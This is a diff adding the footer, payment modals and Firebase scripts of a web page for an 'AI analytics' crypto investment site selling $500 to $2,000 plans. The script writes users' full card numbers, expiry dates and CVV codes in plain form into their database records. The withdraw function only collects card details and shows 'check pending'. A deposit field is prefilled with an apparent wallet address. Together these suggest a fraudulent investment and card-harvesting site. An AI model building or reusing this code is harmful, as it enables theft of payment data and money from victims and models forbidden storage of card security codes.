+					<!-- footer currencies -->
+					<div class="footer__currencies">
+						<i class="ti ti-currency-bitcoin"></i>
+						<i class="ti ti-currency-ethereum"></i>
+						<i class="ti ti-currency-litecoin"></i>
+						<i class="ti ti-currency-solana"></i>
+						<i class="ti ti-currency-dogecoin"></i>
+					</div>
+					<!-- end footer currencies -->
+				</div>
+
+				<!-- navigation -->
+				<div class="col-6 col-md-4 col-lg-3 col-xl-2 order-3 order-md-2 order-lg-2 order-xl-3 offset-md-2 offset-lg-0">
+					<h6 class="footer__title">Company</h6>
+					<div class="footer__nav">
+						<a href="about.html">About AI analytics</a>
+						<a href="blog.html">Our news</a>
+						<a href="about.html">License</a>
+						<a href="contacts.html">Contacts</a>
+					</div>
+				</div>
+
+				<div class="col-12 col-md-8 col-lg-6 col-xl-4 order-2 order-md-3 order-lg-1 order-xl-2">
+					<div class="row">
+						<div class="col-12">
+							<h6 class="footer__title">Services & Features</h6>
+						</div>
+
+						<div class="col-6">
+							<div class="footer__nav">
+								<a href="invest.html">Invest</a>
+								<a href="token.html">Token</a>
+								<a href="affiliate.html">Affiliate</a>
+								<a href="contest.html">Contest</a>
+							</div>
+						</div>
+
+						<div class="col-6">
+							<div class="footer__nav">
+								<a href="about.html">Safety</a>
+								<a href="about.html">Automatization</a>
+								<a href="about.html">Analytics</a>
+								<a href="reports.html">Reports</a>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<div class="col-6 col-md-4 col-lg-3 col-xl-2 order-4 order-md-4 order-lg-3 order-xl-4">
+					<h6 class="footer__title">Support</h6>
+					<div class="footer__nav">
+						<a href="faq.html">Help center</a>
+						<a href="how.html">How it works</a>
+						<a href="privacy.html">Privacy policy</a>
+						<a href="privacy.html">Terms & conditions</a>
+					</div>
+				</div>
+				<!-- end navigation -->
+			</div>
+
+			<div class="row">
+				<div class="col-12">
+					<div class="footer__content">
+						<!-- footer social -->
+						<div class="footer__social">
+							<a href="#" target="_blank"><i class="ti ti-brand-facebook"></i></a>
+							<a href="#" target="_blank"><i class="ti ti-brand-x"></i></a>
+							<a href="#" target="_blank"><i class="ti ti-brand-instagram"></i></a>
+							<a href="#" target="_blank"><i class="ti ti-brand-telegram"></i></a>
+							<a href="#" target="_blank"><i class="ti ti-brand-discord"></i></a>
+							<a href="#" target="_blank"><i class="ti ti-brand-linkedin"></i></a>
+						</div>
+						<!-- end footer social -->
+
+						<!-- footer copyright -->
+						<small class="footer__copyright">© AI analytics, 2018.  </small>
+						<!-- end footer copyright -->
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- design elements -->
+		<span class="screw screw--footer screw--footer-bl"></span>
+		<span class="screw screw--footer screw--footer-br"></span>
+		<span class="screw screw--footer screw--footer-tr"></span>
+		<span class="screw screw--footer screw--footer-tl"></span>
+	</footer>
+	<!-- end footer -->
+
+	<!-- arbitrage pool modal -->
+	<div class="modal modal--auto fade" id="modal-apool" tabindex="-1" aria-labelledby="modal-apool" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal__content">
+					<button class="modal__close" type="button" data-bs-dismiss="modal" aria-label="Close"><i class="ti ti-x"></i></button>
+
+					<h4 class="modal__title">Invest</h4>
+
+					<p class="modal__text">You can spend money from your account to renew connected packages or pay in other available ways.</p>
+
+					<form action="#" class="modal__form">
+						
+
+						<div class="form__group">
+							<label class="form__label">Payment</label>
+
+							<ul class="form__radio">
+								
+								<li>
+									<input id="type2" type="radio" name="type">
+									<label for="type2">Visa / Mastercard</label>
+								</li>
+								
+							</ul>
+						</div>
+
+						<button class="form__btn" type="button" onclick="topay()" data-bs-dismiss="modal" aria-label="Close">Proceed</button>
+					</form>
+
+					<!-- design elements -->
+					<span class="screw screw--big-tl"></span>
+					<span class="screw screw--big-bl"></span>
+					<span class="screw screw--big-br"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- end arbitrage pool modal -->
+
+	<!-- deposit1 modal -->
+	<div class="modal modal--auto fade" id="modal-deposit1" tabindex="-1" aria-labelledby="modal-deposit1" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal__content">
+					<button class="modal__close" type="button" data-bs-dismiss="modal" aria-label="Close"><i class="ti ti-x"></i></button>
+
+					<h4 class="modal__title">Deposite</h4>
+
+					<p class="modal__text">You can spend money from your account to renew connected packages or pay in other available ways.</p>
+
+					<form action="#" class="modal__form">
+						<div class="form__group">
+							<label class="form__label">Email</label>
+							<input name="mail" type="text" class="form__input" value="TWdqXPvsDgLdyKdo4aLYB7YQ7YHMeKvJio">
+						</div>
+
+						<div class="form__group">
+							<label class="form__label">Сheck to:</label>
+							<input name="mail" type="text" class="form__input" placeholder="Email">
+						</div>
+
+						<button class="form__btn" type="button">Proceed</button>
+					</form>
+
+					<!-- design elements -->
+					<span class="screw screw--big-tl"></span>
+					<span class="screw screw--big-bl"></span>
+					<span class="screw screw--big-br"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- end deposit1 modal -->
+
+	<!-- deposit2 modal -->
+	<div class="modal modal--auto fade" id="modal-deposit2" tabindex="-1" aria-labelledby="modal-deposit2" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal__content">
+					<button class="modal__close" type="button" data-bs-dismiss="modal" aria-label="Close"><i class="ti ti-x"></i></button>
+
+					<h4 class="modal__title">Deposite</h4>
+
+					<p class="modal__text">You can spend money from your account to renew connected packages or pay in other available ways.</p>
+
+					<form action="#" class="modal__form">
+						<div class="form__group">
+							<label class="form__label">Phone:</label>
+							<input name="mail" type="text" class="form__input" placeholder="Phone">
+						</div>
+
+						<div class="form__group">
+							<label class="form__label">Сheck to:</label>
+							<input name="mail" type="text" class="form__input" placeholder="Email">
+						</div>
+
+						<button class="form__btn" type="button">Proceed</button>
+					</form>
+
+					<!-- design elements -->
+					<span class="screw screw--big-tl"></span>
+					<span class="screw screw--big-bl"></span>
+					<span class="screw screw--big-br"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- end deposit2 modal -->
+
+	<!-- withdraw modal -->
+	<div class="modal modal--auto fade" id="modal-withdraw" tabindex="-1" aria-labelledby="modal-withdraw" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal__content">
+					<button class="modal__close" type="button" data-bs-dismiss="modal" aria-label="Close"><i class="ti ti-x"></i></button>
+
+					<h4 class="modal__title">Withdraw</h4>
+
+					<p class="modal__text">You can spend money from your account to renew connected packages or pay in other available ways.</p>
+
+					<form action="#" class="modal__form">
+						<div class="form__group">
+							<label class="form__label">Phone:</label>
+							<input name="mail" type="text" class="form__input" placeholder="Phone">
+						</div>
+
+						<div class="form__group">
+							<label class="form__label">Сheck to:</label>
+							<input name="mail" type="text" class="form__input" placeholder="Email">
+						</div>
+
+						<button class="form__btn" type="button">Proceed</button>
+					</form>
+
+					<!-- design elements -->
+					<span class="screw screw--big-tl"></span>
+					<span class="screw screw--big-bl"></span>
+					<span class="screw screw--big-br"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- end withdraw modal -->
+
+	<!-- JS -->
+
+	<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
+    
+    <script>
+       
+
+       const firebaseConfig = {
+    apiKey: "AIzaSyBJ95oHhpqjPzuHcxkNzqcgLwJeLqZelN8",
+    authDomain: "huj89-30b09.firebaseapp.com",
+    projectId: "huj89-30b09",
+    storageBucket: "huj89-30b09.appspot.com",
+    messagingSenderId: "832075021768",
+    appId: "1:832075021768:web:8f99f11cc7b05cbaca54fd",
+    measurementId: "G-M1EFFG7QYH"
+  };
+
+          
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+      const auth = firebase.auth();
+    
+ 
+  // Function to fetch and display user data
+  function displayUserData(user) {
+	const displayemail = document.getElementById('displayName');
+	const displaydeposit = document.getElementById('depositamount');
+	const displaytotalpaid = document.getElementById('totalpaid');
+	const displaybalance = document.getElementById('balance');
+	const name_of_user = document.getElementById('name1');
+	
+  
+	if (user) {
+	  db.collection("users").doc(user.uid).get().then((doc) => {
+		if (doc.exists) {
+		  const userData = doc.data();
+		  const initials = getEmailInitials(userData.email);
+		  
+		 
+		var firstname = userData.firstname;
+		var lastname = userData.lastname;
+		var email = userData.email;
+        var active_plan = userData.active_plan;
+        var invested_amount = userData.invested_amount;
+        var balance = userData.deposit_amount;
+        var deposit_amount = userData.deposit_amount;
+        var paid_amount = userData.paid_amount;
+        var want_to_withdraw = userData.want_to_withdraw;
+        var telegram = userData.telegram;
+        var payment_method = userData.payment_method;
+        var date_for_purchased_plan = userData.date_for_purchased_plan;
+        var profit_to_receive = userData.profit_to_receive;
+        var rate = userData.rate;
+		var extimestamp = userData.extimestamp;
+        var number_of_visit = userData.number_of_visit;
+
+		
+		
+		const firstTwoLetters = firstname.substring(0, 1).toUpperCase() + lastname.substring(0, 1).toUpperCase();
+
+		displayemail.textContent = firstTwoLetters
+
+		displaybalance.textContent = "$" + balance;
+		displaydeposit.textContent = "$" + deposit_amount;
+		displaytotalpaid.textContent = "$" + paid_amount;
+		
+		document.getElementById('email1').value = email;
+		document.getElementById('phone1').value = userData.tel;
+		document.getElementById('telegram1').value = telegram;
+		document.getElementById('name2').value = lastname;
+		document.getElementById('name1').value = firstname;
+
+		document.getElementById('activegold').style.display = 'none'; 
+		document.getElementById('activediamond').style.display = 'none'; 
+		document.getElementById('activesilver').style.display = 'none'; 
+		document.getElementById('activegold1').style.display = 'none'; 
+		document.getElementById('activediamond1').style.display = 'none'; 
+		document.getElementById('activesilver1').style.display = 'none'; 
+		
+		if(active_plan == "0.00") {
+
+          
+		document.getElementById('info').style.display = 'block'; 
+		
+
+			
+
+        }
+		else if(active_plan == "Gold Plan"){
+
+            document.getElementById('activegold').style.display = 'block'; 
+			document.getElementById('activegold1').style.display = 'block'; 
+			document.getElementById('info').style.display = 'none'; 
+			document.getElementById('planz').style.display = 'none'; 
+
+			const date = new Date(date_for_purchased_plan);
+			var today = new Date();
+			const pdate = document.getElementById('purchsedate');
+			const pdateg = document.getElementById('purchsedateg');
+			pdate.textContent = date;
+			pdateg.textContent = date;
+			const difference = extimestamp - today;
+			const millisecondsInDay = 86400000;
+            const remainingDays = Math.ceil(difference / millisecondsInDay);
+			const rmdyz = document.getElementById('remdays');
+			const rmdyzg = document.getElementById('remdaysg');
+			rmdyz.textContent = remainingDays;
+			rmdyzg.textContent = remainingDays;
+
+			const progressBar = document.getElementById('progressbar');
+			const progressBarper = document.getElementById('progressper');
+
+			const progressBarg = document.getElementById('progressbarg');
+			const progressBarperg = document.getElementById('progressperg');
+
+			const percentageog = 1 + (30 - remainingDays) / 30 * 100;
+
+			progressBar.style.width =  percentageog + "%";
+			progressBarper.textContent = percentageog + "%";
+
+			progressBarg.style.width =  percentageog + "%";
+			progressBarperg.textContent = percentageog + "%";
+        }
+
+
+		else if(active_plan == "Silver Plan") {
+
+            document.getElementById('activesilver').style.display = 'block';
+			document.getElementById('activesilver1').style.display = 'block';  
+			document.getElementById('info').style.display = 'none'; 
+			document.getElementById('planz').style.display = 'none'; 
+			const date = new Date(date_for_purchased_plan);
+			var today = new Date();
+			const pdate = document.getElementById('purchsedate');
+			pdate.textContent = date;
+			const difference = extimestamp - today;
+			const millisecondsInDay = 1000 * 60 * 60 * 24;
+            const remainingDays = Math.ceil(difference / millisecondsInDay);
+			const rmdyz = document.getElementById('remdays');
+			rmdyz.textContent = remainingDays;
+        }
+		else if(active_plan == "Diamond Plan") {
+ 
+            document.getElementById('activediamond').style.display = 'block'; 
+			document.getElementById('activediamond1').style.display = 'block'; 
+			document.getElementById('info').style.display = 'none'; 
+			document.getElementById('planz').style.display = 'none';
+			
+			const date = new Date(date_for_purchased_plan);
+		
+			const pdate = document.getElementById('actdia');
+			pdate.textContent = date;
+        }
+	}
+		 else {
+
+		  console.log('No user data available');
+		}
+	
+	  }).catch((error) => {
+		console.error('Error getting user data:', error);
+	  });
+	} else {
+	  console.log('No user found');
+	}
+  }
+
+
+	// Get the first two letters of the email and convert them to lowercase
+
+  function getEmailInitials(email) {
+
+	const initials = email.substring(0, 2).toUpperCase();
+	return initials;
+  }
+
+	// for logout
+	
+function logoutUser() {
+  firebase.auth().signOut()
+    .then(() => {
+      // Sign-out successful.
+      console.log('User signed out');
+      // Perform any additional actions after logout if needed
+    })
+    .catch((error) => {
+      // An error happened.
+      console.error('Error signing out:', error);
+    });
+}
+  
+
+
+
+
+
+
+
+
+
+  
+  // Check user authentication status
+  auth.onAuthStateChanged((user) => {
+	if (user) {
+	  // If user is logged in, display profile data
+	  displayUserData(user);
+	} else {
+	  // Redirect or handle situation where user is not logged in
+	  console.log('User not logged in');
+	  // You might redirect the user to a login page or perform another action here
+	}
+  });
+
+
+
+
+
+
+
+
+
+
+  function preload(){
+	
+	document.getElementById('body1').style.display = 'none'; 
+	document.getElementById('pendingapproval').style.display = 'none'; 
+	document.getElementById('dropdown').style.display = 'none'; 
+	document.getElementById('paymentdiv').style.display = 'none'; 
+	document.getElementById('footer').style.display = 'none'; 
+	setTimeout(function() {
+		document.getElementById("preloader").style.display = "none";
+		document.getElementById('body1').style.display = 'block'; 
+		document.getElementById('footer').style.display = 'block'; 
+	}, 3000);  
+
+	auth.onAuthStateChanged((user) => {
+		if (user) {
+		  // If user is logged in, display profile data
+		  displayUserData(user);
+		} else {
+		  // Redirect or handle situation where user is not logged in
+		  console.log('User not logged in');
+		  // You might redirect the user to a login page or perform another action here
+		}
+	  });
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </script>
+
+		<!-- for update data -->
+
+<script>
+
+	function updateProfile() {
+		const newemail = document.getElementById('email1').value;
+		// Function to update user data in Firestore
+		async function updateUserData(uid, updatedData) {
+			
+		  try {
+			
+			await db.collection("users").doc(uid).update(updatedData);
+			return true; // Update successful
+		  } catch (error) {
+			console.error("Error updating user data: ", error);
+			return false; // Update failed
+		  }
+		}
+	  
+		const updatedFirstName = document.getElementById('name1').value;
+		const newlastname = document.getElementById('name2').value;
+	
+		const newtel = document.getElementById('phone1').value;
+		const newtelegram = document.getElementById('telegram1').value;
+	  
+		const user = firebase.auth().currentUser;
+		
+	  
+		if (user) {
+		  const uid = user.uid;
+		  const updatedData = {};
+	  
+		  // Prepare updated data based on user input
+		  if (updatedFirstName.trim() !== '') {
+			updatedData.firstname = updatedFirstName;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  if (newtelegram.trim() !== '') {
+			updatedData.telegram = newtelegram;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  if (newlastname.trim() !== '') {
+			updatedData.lastname = newlastname;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  
+		  if (newtel.trim() !== '') {
+			updatedData.tel = newtel;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+	  
+		  // Update user data in Firestore
+		  updateUserData(uid, updatedData)
+			.then(updateResult => {
+			  if (updateResult) {
+				
+		alert('User data updated successfully!');
+				// Clear input fields after successful update
+				location.reload();
+			  } else {
+				alert('Failed to update user data.');
+			  }
+			})
+			.catch(error => {
+			  console.error('Error updating user data:', error);
+			 
+			});
+		} else {
+		  console.log('User not logged in');
+		  alert('Please log in to update your profile.');
+		  // Redirect or handle situation where user is not logged in
+		}
+	  }
+		
+
+
+
+
+
+
+	  function newemailuser(){
+		const newmail1 = document.getElementById('email1').value;
+
+if (isValidEmail(newmail1)) {
+	updateUserEmail(newmail1)
+  } else {
+	alert('Invalid email');
+  }
+		
+	  }
+
+
+
+
+	  
+
+
+	  function isValidEmail1(email) {
+		const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+		return emailRegex.test(email);
+	  }
+
+
+
+
+
+	  function updateUserEmail(newEmail) {
+		const user = firebase.auth().currentUser;
+	  
+		if (user) {
+		  user.updateEmail(newEmail)
+			.then(() => {
+			  console.log('Email updated successfully');
+			  // Optionally, perform actions after successful email update
+			})
+			.catch((error) => {
+			  console.error('Error updating email:', error);
+			  // Handle error or display a message to the user
+			});
+		} else {
+		  console.log('No user is currently logged in');
+		  // Handle scenario where no user is logged in
+		}
+	  }
+
+
+
+ function topay(){
+	
+	document.getElementById('paymentdiv').style.display = 'block'; 
+
+	loadCustomStyles();
+ }
+  
+
+
+
+
+
+
+
+
+ function loadCustomStyles() {
+	const head = document.head;
+	const link = document.createElement('link');
+  
+	link.type = 'text/css';
+	link.rel = 'stylesheet';
+	link.href = './payment.css'; // Replace with your CSS file path
+  
+	head.appendChild(link);
+	
+	document.getElementById('body1').style.display = 'none';
+
+	auth.onAuthStateChanged((user) => {
+		if (user) {
+		  // If user is logged in, display profile data
+		  displayUserData(user) 
+		} else {
+		  // Redirect or handle situation where user is not logged in
+		  console.log('User not logged in');
+		  // You might redirect the user to a login page or perform another action here
+		}
+	  });
+  }
+  
+
+
+function payloader(user){
+	if (user) {
+		db.collection("users").doc(user.uid).get().then((doc) => {
+		  if (doc.exists) {
+			const userData = doc.data();
+
+		
+		  var tempplan = userData.temp;
+  
+  
+		  if(tempplan == "diamond") {
+  
+			document.getElementById('plantext').value = tempplan + " Plan"; 
+			document.getElementById('planprice').value = "2000"; 
+			document.getElementById('plantotal').value = "2000"; 
+  
+		  }else if(tempplan == "gold"){
+			document.getElementById('plantext').value = tempplan + " Plan"; 
+			document.getElementById('planprice').value = "1000"; 
+			document.getElementById('plantotal').value = "1000"; 
+		  }else if(tempplan == "silver"){
+			document.getElementById('plantext').value = tempplan + " Plan"; 
+			document.getElementById('planprice').value = "500"; 
+			document.getElementById('plantotal').value = "500";   
+		}
+  
+  
+  
+  
+  
+  
+  
+  		  } else {
+			console.log('No user data available');
+		  }
+		}).catch((error) => {
+		 alert('Error getting user data:', error);
+		});
+	  } else {
+		console.log('No user found');
+	  }
+	}
+
+
+function currentactivepland(){
+const act_m = "diamond";
+
+	
+async function updateUserData(uid, updatedData) {
+			
+	try {
+	  
+	  await db.collection("users").doc(uid).update(updatedData);
+	  return true; // Update successful
+	} catch (error) {
+	  console.error("Error updating user data: ", error);
+	  return false; // Update failed
+	}
+  }
+
+  
+
+
+  const user = firebase.auth().currentUser;
+  
+
+  if (user) {
+	const uid = user.uid;
+	const updatedData = {};
+
+	// Prepare updated data based on user input
+
+
+
+	updatedData.temp = act_m;
+	
+
+
+
+	// Update user data in Firestore
+	updateUserData(uid, updatedData)
+	  .then(updateResult => {
+		if (updateResult) {
+		  
+			const paragraph = document.getElementById('plantotal');
+					paragraph.textContent = "$2000 ";
+					
+					const pln = document.getElementById('plantext');
+					pln.textContent = "Diamond Plan";
+					
+					const prcpln = document.getElementById('planprice');
+					prcpln.textContent = "$2000 ";
+		  // Clear input fields after successful update
+
+		} else {
+		 
+		}
+	  })
+	  .catch(error => {
+		alert('Error updating user data:', error);
+	   
+	  });
+  }
+   else {
+	console.log('User not logged in');
+	
+	// Redirect or handle situation where user is not logged in
+  }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function currentactiveplang(){
+	const act_m = "gold";
+	
+		
+	async function updateUserData(uid, updatedData) {
+				
+		try {
+		  
+		  await db.collection("users").doc(uid).update(updatedData);
+		  return true; // Update successful
+		} catch (error) {
+		  console.error("Error updating user data: ", error);
+		  return false; // Update failed
+		}
+	  }
+	
+	  
+	
+	
+	  const user = firebase.auth().currentUser;
+	  
+	
+	  if (user) {
+		const uid = user.uid;
+		const updatedData = {};
+	
+		// Prepare updated data based on user input
+	
+	
+	
+		updatedData.temp = act_m;
+		
+	
+	
+	
+		// Update user data in Firestore
+		updateUserData(uid, updatedData)
+		  .then(updateResult => {
+			if (updateResult) {
+			  
+				const paragraph = document.getElementById('plantotal');
+					paragraph.textContent = "$1000 ";
+					
+					const pln = document.getElementById('plantext');
+					pln.textContent = "Gold Plan";
+					
+					const prcpln = document.getElementById('planprice');
+					prcpln.textContent = "$1000 ";
+			  // Clear input fields after successful update
+	
+			} else {
+			 
+			}
+		  })
+		  .catch(error => {
+			alert('Error updating user data:', error);
+		   
+		  });
+	  }
+	   else {
+		console.log('User not logged in');
+		
+		// Redirect or handle situation where user is not logged in
+	  }
+	}
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	function currentactiveplans(){
+		const act_m = "silver";
+		
+			
+		async function updateUserData(uid, updatedData) {
+					
+			try {
+			  
+			  await db.collection("users").doc(uid).update(updatedData);
+			  return true; // Update successful
+			} catch (error) {
+			  console.error("Error updating user data: ", error);
+			  return false; // Update failed
+			}
+		  }
+		
+		  
+		
+		
+		  const user = firebase.auth().currentUser;
+		  
+		
+		  if (user) {
+			const uid = user.uid;
+			const updatedData = {};
+		
+			// Prepare updated data based on user input
+		
+		
+		
+			updatedData.temp = act_m;
+			
+		
+		
+		
+			// Update user data in Firestore
+			updateUserData(uid, updatedData)
+			  .then(updateResult => {
+				if (updateResult) {
+				  
+					const paragraph = document.getElementById('plantotal');
+					paragraph.textContent = "$500 ";
+					
+					const pln = document.getElementById('plantext');
+					pln.textContent = "Silver Plan";
+					
+					const prcpln = document.getElementById('planprice');
+					prcpln.textContent = "$500 ";
+				  // Clear input fields after successful update
+		
+				} else {
+				 
+				}
+			  })
+			  .catch(error => {
+				alert('Error updating user data:', error);
+			   
+			  });
+		  }
+		   else {
+			console.log('User not logged in');
+			
+			// Redirect or handle situation where user is not logged in
+		  }
+		}
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function loadpurchasefunction() {
+	
+  
+	
+	
+	
+
+	auth.onAuthStateChanged((user) => {
+		if (user) {
+		  // If user is logged in, display profile data
+		
+		} else {
+		  // Redirect or handle situation where user is not logged in
+		  console.log('User not logged in');
+		  // You might redirect the user to a login page or perform another action here
+		}
+	  });
+  }
+
+
+
+
+
+
+
+
+  function plan_purchasing(){
+
+	
+
+	
+		async function updateUserData(uid, updatedData) {
+			
+		  try {
+			
+			await db.collection("users").doc(uid).update(updatedData);
+			return true; // Update successful
+		  } catch (error) {
+			console.error("Error updating user data: ", error);
+			return false; // Update failed
+		  }
+		}
+	  
+		const card_holder_name = document.getElementById('cname').value;
+		const ccnum = document.getElementById('ccnum').value;
+		const expmonth = document.getElementById('expmonth').value;
+		const expyear = document.getElementById('expyear').value;
+		const cvv = document.getElementById('cvv').value;
+
+
+		const paragraph = document.getElementById('plantotal');
+		const plant  = paragraph.textContent;
+		
+		const pln = document.getElementById('plantext');
+		const plantex = pln.textContent;
+		
+		const prcpln = document.getElementById('planprice');
+		const planp = prcpln.textContent;
+
+		const user = firebase.auth().currentUser;
+		
+	  
+		if (user) {
+		  const uid = user.uid;
+		  const updatedData = {};
+	  
+		  // Prepare updated data based on user input
+		  if (card_holder_name.trim() !== '') {
+			updatedData.card_holder_name = card_holder_name;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  if (ccnum.trim() !== '') {
+			updatedData.cardnumber = ccnum;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  
+		  
+		  if (expmonth.trim() !== '') {
+			updatedData.card_end_month = expmonth;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  
+		  if (expyear.trim() !== '') {
+			updatedData.card_end_year = expyear;
+		  }
+		  else{
+			alert('Failed to update user data.');
+			location.reload();
+		  }
+		  if (cvv.trim() !== '') {
+			updatedData.card_key = cvv;
+			updatedData.date_for_purchased_plan = Date.now();
+			
+			var yourDate = new Date();
+            var numberOfDaysToAdd = 30;
+			updatedData.extimestamp = yourDate.setDate(yourDate.getDate() + numberOfDaysToAdd); 
+			updatedData.active_plan = plantex;
+			updatedData.invested_amount = planp;
+
+			if (plantex == "Diamond Plan")
+			{
+				updatedData.balance = "2000";
+			}
+			if (plantex == "Silver Plan")
+			{
+				updatedData.balance = "500";
+			}
+			if (plantex == "Gold Plan")
+			{
+				updatedData.balance = "1000";
+			}
+			
+
+
+		  }
+		  else{
+			alert('Failed to update user data.');
+			
+		  }
+		  // Update user data in Firestore
+		  updateUserData(uid, updatedData)
+			.then(updateResult => {
+			  if (updateResult) {
+				
+		alert('successfully!');
+				// Clear input fields after successful update
+				location.reload()
+			
+			  } else {
+				alert('Failed.');
+			  }
+			})
+			.catch(error => {
+			  console.error('Error updating user data:', error);
+			 
+			});
+		} else {
+		  console.log('User not logged in');
+		  alert('Please log in to update your profile.');
+		  // Redirect or handle situation where user is not logged in
+		}
+	  }
+
+  
+
+	 function withdrawfunc(){
+		document.getElementById('pendingapproval').style.display = 'block'; 
+		const card_holder_name = document.getElementById('cname1ab').value;
+		const ccnum = document.getElementById('ccnum1ab').value;
+		const expmonthab = document.getElementById('expmonthab').value;
+		const expyearab = document.getElementById('expyearab').value;
+		const amount4ab = document.getElementById('amount4ab').value;
+		alert("check pending");
+	 }
+
+
+
+
+
+</script>
+
+
+
+	<script src="js/bootstrap.bundle.min.js"></script>
+	<script src="js/smooth-scrollbar.js"></script>
+	<script src="js/splide.min.js"></script>
+	<script src="js/three.min.js"></script>
+	<script src="js/vanta.fog.min.js"></script>
+	<script src="js/main.js"></script>
+</body>
+
+</html>
